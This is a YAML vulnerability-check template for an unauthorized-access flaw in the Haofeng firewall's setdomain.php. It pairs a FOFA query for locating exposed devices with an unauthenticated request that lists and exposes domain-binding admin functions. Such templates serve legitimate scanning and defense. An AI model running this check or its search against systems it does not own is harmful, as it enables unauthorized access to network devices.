expression: r0()
id: haofeng-firewall-setdomain-unauth
info:
  author: "\u4F60\u662F\u732A"
  description: "FOFA\uFF1Aapp=\"\u7693\u5CF0\u9632\u706B\u5899\u7CFB\u7EDF\u767B\u5F55\
    \"\n"
  name: "\u7693\u5CF0\u9632\u706B\u5899 setdomain.php \u8D8A\u6743\u8BBF\u95EE\u6F0F\
    \u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/%E7%9A%93%E5%B3%B0/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99%20setdomain.php%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html
  severity: medium
rules:
  r0:
    expression: "response.status == 200 && response.body.bcontains(b'<title>\u7693\
      \u5CF0\u7CFB\u7EDF\u7BA1\u7406\u5E73\u53F0</title>') && response.body.bcontains(b'\u57DF\
      \u540D\u7ED1\u5B9A\u5217\u8868')  && response.body.bcontains(b'[\u4FEE\u6539\
      ]') && response.body.bcontains(b'[\u5220\u9664]')"
    request:
      method: GET
      path: /setdomain.php?action=list
